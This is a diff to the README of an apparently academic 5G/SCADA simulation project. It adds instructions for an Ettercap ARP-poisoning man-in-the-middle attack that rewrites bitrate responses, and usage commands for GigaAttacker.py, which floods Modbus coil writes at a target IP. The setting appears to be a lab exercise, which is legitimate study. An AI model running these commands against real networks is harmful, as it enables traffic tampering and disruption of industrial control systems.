@@ -20,6 +20,8 @@
 - [Configuration](#configuration)
 - [Usage](#usage)
 - [Usage Examples](#usage-examples)
+- [Ettercap MiTM](#MiTM-with-Ettercap)
+- [GigaAttacker.py](#GigaAttacker)
 - [Known Issues](#known-issues)
 - [Contributing](#contributing)
 - [Security Considerations](#security-considerations)
@@ -165,20 +167,76 @@ The graph provides a visual representation of the bitrate for each tower over th
 
 Feel free to explore these features to optimize the performance and configuration of the 5G towers within the system.
 
-### MiTM with Ettercap
+## MiTM with Ettercap
 
+To perform a Man-in-the-Middle (MiTM) attack with Ettercap, follow these steps:
 
-### GigaAttacker
-GigaAttacker.py is a simple script that sends modbus packets to change coils, it also has a loop function if multiple packets are to be sent.
-`python gigattacker.py -h` for help options
-Examples:
-`python gigaattacker.py -write-coil -addr 1 -val 0 -ip 192.168.0.100 -p 502` writes the coil on register 1 with value 0 for the ip 192.168.0.100 on port 502                                          
-`python gigaattacker -write-coil -addr 1 -val 0 -ip 192.168.0.100 -loop 1000 -t 0.5` does the same as above but 1000 times with a timeout of 0.5 seconds
+1. **Download and Install Ettercap**
+
+   Make sure to have Ettercap installed on your system. On Ubuntu, use the following command:
+
+   ```bash
+   sudo apt-get install ettercap
+   ```
+
+2. **Download Ettercap Filter**
+
+   Download the Ettercap filter named `bitrate_response.filter`. Move the filter to the Ettercap directory:
+
+   ```bash
+   sudo mv bitrate_response.filter /usr/share/ettercap
+   ```
+
+3. **Compile the Filter**
+
+   Open a terminal in the `/usr/share/ettercap` directory and run the following commands:
+
+   ```bash
+   sudo etterfilter -o bitrate_response.ef bitrate_response.filter
+   ```
+
+4. **Initiate ARP Poisoning**
+
+   In the same terminal, execute the following command to start ARP poisoning. Replace `YOUR_NIC`, `FIRST_IP_SPOOF`, and `SECOND_IP_SPOOF` with your network interface card, first IP for spoofing, and second IP for spoofing respectively:
+
+   ```bash
+   sudo ettercap -T -i YOUR_NIC -F bitrate_response.ef -q -M arp /FIRST_IP_SPOOF// /SECOND_IP_SPOOF// -V hex
+   ```
+
+   This filter alters the bitrate response from the slave to 1337. Modify the filter to adjust values, IP addresses, and ports as needed.
+
+## GigaAttacker
+
+`GigaAttacker.py` is a Python script for sending modbus packets to manipulate coils. It includes a loop function for sending multiple packets.
+
+### Usage:
+
+Run the script using the following command:
+
+```bash
+python GigaAttacker.py -h
+```
+
+#### Examples:
+
+1. Write a coil on register 1 with value 0 for the IP 192.168.0.100 on port 502:
+
+   ```bash
+   python GigaAttacker.py -write-coil -addr 1 -val 0 -ip 192.168.0.100 -p 502
+   ```
+
+2. Write a coil on register 1 with value 0 for the IP 192.168.0.100, repeating 1000 times with a timeout of 0.5 seconds:
+
+   ```bash
+   python GigaAttacker.py -write-coil -addr 1 -val 0 -ip 192.168.0.100 -loop 1000 -t 0.5
+   ```
+
+Feel free to customize the script parameters based on your requirements.
 
 ## Known Issues
 Known issues will be presented here
 
-Issue 1:
+Issue 1: 
 
 ## Contributing
 Our project ends on 15 December 2023, and If you want to add more features for the future feel free to do so.
@@ -245,11 +303,11 @@ Sprint 2:
 
 Sprint 3:
 
-❌ F10: Documentation
+✅ F10: Documentation
 
-❌ F11: Launch Attack on SCADA Server
+✅ F11: Launch Attack on SCADA Server
 
-❌ F13: Simulation Dashboard (advanced)
+✅ F13: Simulation Dashboard (advanced)
 
 ## Contact
 - You can contact the project team at [olbo20@student.bth.se](mailto:olbo20@student.bth.se).
